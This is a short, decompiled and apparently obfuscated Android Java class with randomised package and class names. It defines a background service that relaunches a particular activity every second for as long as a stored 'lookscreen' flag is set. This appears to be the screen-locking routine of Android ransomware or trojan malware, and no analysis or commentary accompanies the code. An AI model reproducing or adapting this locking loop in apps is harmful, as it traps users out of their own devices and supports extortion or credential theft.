package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.content.Intent;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.ncec.zjwruw;

public class ttiegryczsx extends IntentService {

    /* renamed from: a */
    C0034b f569a = new C0034b();

    public ttiegryczsx() {
        super("ttiegryczsx");
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            try {
                startActivity(new Intent(this, zjwruw.class));
                if (!this.f569a.mo234e(this, "lookscreen").equals("true")) {
                    return;
                }
            } catch (Exception unused) {
                this.f569a.mo213a("ERROR", "zjwruw");
            }
        }
    }
}
